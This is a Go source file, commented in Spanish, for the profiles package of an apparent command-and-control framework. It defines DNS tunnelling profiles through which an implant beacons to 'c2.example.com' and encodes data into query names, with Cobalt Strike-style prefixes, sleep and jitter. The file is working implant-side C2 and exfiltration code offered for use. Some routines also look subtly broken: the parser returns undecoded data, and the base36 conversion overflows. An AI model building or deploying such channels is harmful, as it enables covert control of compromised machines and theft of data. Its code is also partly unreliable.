package profiles

import (
	"encoding/base32"
	"encoding/base64"
	"encoding/hex"
	"fmt"
	"math/rand"
	"strconv"
	"strings"
	"time"
)

type Encoding string

const (
	EncodingBase32 Encoding = "base32"
	EncodingBase64 Encoding = "base64"
	EncodingHex    Encoding = "hex"
	EncodingBase36 Encoding = "base36"
)

type RecordType string

const (
	RecordTXT   RecordType = "TXT"
	RecordA     RecordType = "A"
	RecordAAAA  RecordType = "AAAA"
	RecordCNAME RecordType = "CNAME"
)

type DNSProfile struct {
	Name string

	// Dominio autoritativo (ej: "c2.example.com").
	Domain string

	// Formato del QNAME. Los caracteres 'X' son slots de datos.
	// El resto son decoradores literales.
	//
	// IMPORTANTE: el Format NO debe incluir el dominio. El FQDN se
	// construye como "<Format con X reemplazados>.<Domain>". Repetir
	// el dominio (ej: ".c2" cuando Domain="c2.example.com") rompe
	// ParseQNAME, que asume que el último label antes del dominio es
	// el sessionID.
	//
	// Placeholders soportados:
	//   {seq}   → número de secuencia (hex)
	//   {total} → total de chunks (hex)
	//   {id}    → session_key (o implant_id) del implante
	//
	// Ejemplo correcto: "{seq}-{total}.X.{id}" con Domain="c2.example.com"
	//   → "0-3.a1b2c3.x7y8z9.c2.example.com"
	//
	// Ejemplo INCORRECTO: "{seq}-{total}.X.{id}.c2"
	//   → "0-3.a1b2c3.x7y8z9.c2.c2.example.com"  ← ParseQNAME falla
	Format string

	// Codificación de los datos en los slots.
	Encoding Encoding

	// Tipo de registro de las respuestas del server.
	RecordType RecordType

	// TTL de las respuestas DNS (segundos).
	TTL int

	// Tamaño máximo de un label DNS (máximo 63 según RFC 1035).
	MaxLabelSize int

	// Número máximo de chunks por envelope.
	MaxChunks int

	// Prefijos de subhost para diferentes tipos de mensajes
	// (estilo Cobalt Strike).
	BeaconPrefix string
	PollPrefix   string
	OutputPrefix string

	// IP idle: dirección devuelta en registros A cuando no hay tareas.
	// Solo aplica si RecordType == RecordA.
	IdleIP string

	// Sleep base en segundos entre beacons.
	Sleep int

	// Jitter en porcentaje (0-100).
	Jitter int
}

var DNSTXTProfile = &DNSProfile{
	Name:         "dns-txt",
	Domain:       "c2.example.com",
	Format:       "{seq}-{total}.X.{id}",
	Encoding:     EncodingBase32,
	RecordType:   RecordTXT,
	TTL:          0,
	MaxLabelSize: 63,
	MaxChunks:    128,
	BeaconPrefix: "bc",
	PollPrefix:   "pl",
	OutputPrefix: "out",
	Sleep:        60,
	Jitter:       20,
}

var DNSAProfile = &DNSProfile{
	Name:         "dns-a",
	Domain:       "c2.example.com",
	Format:       "{seq}-{total}.X.{id}",
	Encoding:     EncodingHex,
	RecordType:   RecordA,
	TTL:          0,
	MaxLabelSize: 63,
	MaxChunks:    16,
	BeaconPrefix: "bc",
	PollPrefix:   "pl",
	OutputPrefix: "out",
	IdleIP:       "0.0.0.0",
	Sleep:        60,
	Jitter:       20,
}

var DNSDoHProfile = &DNSProfile{
	Name:         "dns-doh",
	Domain:       "c2.example.com",
	Format:       "{seq}.X.{id}",
	Encoding:     EncodingBase32,
	RecordType:   RecordTXT,
	TTL:          0,
	MaxLabelSize: 63,
	MaxChunks:    12,
	BeaconPrefix: "bc",
	PollPrefix:   "pl",
	OutputPrefix: "out",
	Sleep:        120,
	Jitter:       30,
}

func (p *DNSProfile) EncodeData(data []byte) string {
	switch p.Encoding {
	case EncodingBase32:
		return base32.StdEncoding.WithPadding(base32.NoPadding).EncodeToString(data)
	case EncodingBase64:
		return base64.RawURLEncoding.EncodeToString(data)
	case EncodingHex:
		return hex.EncodeToString(data)
	case EncodingBase36:
		return encodeBase36(data)
	default:
		return base32.StdEncoding.WithPadding(base32.NoPadding).EncodeToString(data)
	}
}

func (p *DNSProfile) DecodeData(s string) ([]byte, error) {
	switch p.Encoding {
	case EncodingBase32:
		pad := len(s) % 8
		if pad != 0 {
			s += strings.Repeat("=", 8-pad)
		}
		return base32.StdEncoding.DecodeString(s)
	case EncodingBase64:
		return base64.RawURLEncoding.DecodeString(s)
	case EncodingHex:
		return hex.DecodeString(s)
	case EncodingBase36:
		return decodeBase36(s)
	default:
		pad := len(s) % 8
		if pad != 0 {
			s += strings.Repeat("=", 8-pad)
		}
		return base32.StdEncoding.DecodeString(s)
	}
}

func (p *DNSProfile) BuildQNAME(data []byte, seq, total int, sessionID string) string {
	encoded := p.EncodeData(data)

	format := p.Format
	format = strings.ReplaceAll(format, "{seq}", fmt.Sprintf("%x", seq))
	format = strings.ReplaceAll(format, "{total}", fmt.Sprintf("%x", total))
	format = strings.ReplaceAll(format, "{id}", sessionID)

	slots := strings.Count(format, "X")
	if slots == 0 {
		return format + "." + p.Domain
	}

	chunkSize := len(encoded) / slots
	if chunkSize == 0 {
		chunkSize = 1
	}
	chunks := make([]string, 0, slots)
	for i := 0; i < slots; i++ {
		start := i * chunkSize
		end := start + chunkSize
		if i == slots-1 {
			end = len(encoded)
		}
		if start >= len(encoded) {
			chunks = append(chunks, "")
			continue
		}
		if end > len(encoded) {
			end = len(encoded)
		}
		chunks = append(chunks, encoded[start:end])
	}

	var sb strings.Builder
	chunkIdx := 0
	for _, r := range format {
		if r == 'X' && chunkIdx < len(chunks) {
			sb.WriteString(chunks[chunkIdx])
			chunkIdx++
		} else {
			sb.WriteRune(r)
		}
	}

	return sb.String() + "." + p.Domain
}

func (p *DNSProfile) ParseQNAME(qname string) (data []byte, seq, total int, sessionID string, err error) {
	qname = strings.TrimSuffix(qname, ".")
	domain := strings.TrimSuffix(p.Domain, ".")
	if !strings.HasSuffix(qname, domain) {
		return nil, 0, 0, "", fmt.Errorf("dns profile: qname %q no termina en dominio %q", qname, domain)
	}
	prefix := strings.TrimSuffix(qname, domain)
	prefix = strings.TrimSuffix(prefix, ".")

	// Extraer labels.
	labels := strings.Split(prefix, ".")

	// Parsear seq-total del primer label.
	if len(labels) < 2 {
		return nil, 0, 0, "", fmt.Errorf("dns profile: qname demasiado corto")
	}
	seqTotal := labels[0]
	parts := strings.SplitN(seqTotal, "-", 2)
	if len(parts) != 2 {
		return nil, 0, 0, "", fmt.Errorf("dns profile: label %q sin formato seq-total", seqTotal)
	}
	s, err := parseIntHex(parts[0])
	if err != nil {
		return nil, 0, 0, "", err
	}
	t, err := parseIntHex(parts[1])
	if err != nil {
		return nil, 0, 0, "", err
	}

	// Los labels intermedios son los datos.
	dataLabels := labels[1 : len(labels)-1]
	if len(dataLabels) == 0 {
		return nil, 0, 0, "", fmt.Errorf("dns profile: sin labels de datos")
	}
	encoded := strings.Join(dataLabels, "")

	// El último label es el sessionID.
	sessionID = labels[len(labels)-1]

	return []byte(encoded), s, t, sessionID, nil
}

func (p *DNSProfile) JitteredSleep() time.Duration {
	base := time.Duration(p.Sleep) * time.Second
	if p.Jitter <= 0 {
		return base
	}
	jitter := base * time.Duration(p.Jitter) / 100
	return base + time.Duration(rand.Int63n(int64(jitter)))
}

const base36Charset = "0123456789abcdefghijklmnopqrstuvwxyz"

func encodeBase36(data []byte) string {
	var n uint64
	for _, b := range data {
		n = n*256 + uint64(b)
	}
	if n == 0 {
		return "0"
	}
	var sb strings.Builder
	for n > 0 {
		sb.WriteByte(base36Charset[n%36])
		n /= 36
	}
	runes := []rune(sb.String())
	for i, j := 0, len(runes)-1; i < j; i, j = i+1, j-1 {
		runes[i], runes[j] = runes[j], runes[i]
	}
	return string(runes)
}

func decodeBase36(s string) ([]byte, error) {
	var n uint64
	for _, c := range s {
		idx := strings.IndexRune(base36Charset, c)
		if idx < 0 {
			return nil, fmt.Errorf("base36: carácter inválido %q", c)
		}
		n = n*36 + uint64(idx)
	}
	var out []byte
	for n > 0 {
		out = append([]byte{byte(n % 256)}, out...)
		n /= 256
	}
	return out, nil
}

func parseIntHex(s string) (int, error) {
	n, err := strconv.ParseInt(s, 16, 32)
	return int(n), err
}
